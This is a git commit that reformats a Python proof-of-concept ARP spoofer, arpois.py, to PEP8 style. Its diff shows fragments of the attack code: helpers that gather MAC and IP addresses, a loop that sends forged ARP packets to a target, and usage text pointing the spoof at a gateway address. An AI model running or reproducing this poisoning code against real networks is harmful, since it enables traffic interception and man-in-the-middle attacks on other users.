ec03d4037b113813dd30ef22912a658c203a90f3
Erethon <info@erethon.com>
2013-06-13 00:48:50 +0300

    Made code pep8 compliant

--- arpois.py
+++ arpois.py
@@ -1,4 +1,5 @@
-# A proof of concept ARP spoofer by Erethon, please check README.mb and LICENSE files.
+# A proof of concept ARP spoofer by Erethon
+# Please check README.mb and LICENSE files.
 # The purpose of this script is stricly educational. It's a proof of concept
 # and I haven't really tested it, so I don't know if it will work.
 # Once again this is to be used for educational purposes only, I am in no way
@@ -16,14 +17,14 @@ import subprocess
 
 
 def get_src_mac():
-    mac_dec= hex(getnode())[2:-1]
+    mac_dec = hex(getnode())[2:-1]
     while (len(mac_dec) != 12):
-        mac_dec="0" + mac_dec
+        mac_dec = "0" + mac_dec
     return unhexlify(mac_dec)
 
 
 def create_dst_ip_addr():
-    dst_ip_addr=''
+    dst_ip_addr = ''
     ip_src_dec = argv[2]
     ip_src_dec = ip_src_dec.split(".")
     for i in range(len(ip_src_dec)):
@@ -40,10 +41,11 @@ def get_src_ip_addr():
 
 
 def get_dst_mac_addr():
-    p = subprocess.Popen(["arping", argv[2] ,"-c", "1"], shell = False, stdout = subprocess.PIPE)
+    p = subprocess.Popen(["arping", argv[2], "-c", "1"],
+                         shell=False, stdout=subprocess.PIPE)
     sleep(2)
-    remote_mac = search('(([0-9a-f]{2}:){5}[0-9a-f]{2})',p.communicate()[0])
-    return unhexlify(remote_mac.group(0).replace(':',''))
+    remote_mac = search('(([0-9a-f]{2}:){5}[0-9a-f]{2})', p.communicate()[0])
+    return unhexlify(remote_mac.group(0).replace(':', ''))
 
 
 def create_pkt_arp_poison():
@@ -60,10 +62,11 @@ def create_pkt_arp_poison():
 
     while(1):
         sleep(2)
-        s.send(dst_addr+src_addr+ethertype+payload+src_addr+src_ip_addr+dst_mac_addr+dst_ip_addr+checksum)
+        s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
+               + dst_mac_addr + dst_ip_addr + checksum)
         print "Sending forged packets to " + argv[2]
 
-if (len(argv) != 4 ):
+if (len(argv) != 4):
     print "Usage: python arpois.py interface target_ip spoofing_ip."
     print "Example: python arpois.py wlan0 192.168.1.42 192.168.1.1"
     exit()
